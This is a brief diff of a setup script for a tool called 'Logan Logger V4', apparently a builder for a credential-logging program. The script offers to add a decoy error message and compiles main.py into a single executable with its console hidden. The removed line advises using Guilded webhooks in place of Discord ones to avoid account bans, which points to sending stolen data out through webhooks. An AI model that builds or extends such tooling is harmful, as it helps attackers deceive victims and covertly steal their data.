@@ -6,7 +6,6 @@ ctypes.windll.kernel32.SetConsoleTitleW("Logan Logger V4 | Setup")
 
 os.system('cls')
 
-print('TIP: Use Guilded webhooks instead of Discord webhooks to prevent getting your account banned.')
 msg = input('show error message? (Y/N) ')
 if msg.lower() == 'y':
     with open('stuff/msgbox.py', 'w', encoding='utf-8') as f:
@@ -51,4 +50,5 @@ os.system('pip install -r requirements.txt')
 os.system("pyinstaller --onefile --noconsole main.py")
 
 os.startfile('dist')
+
 
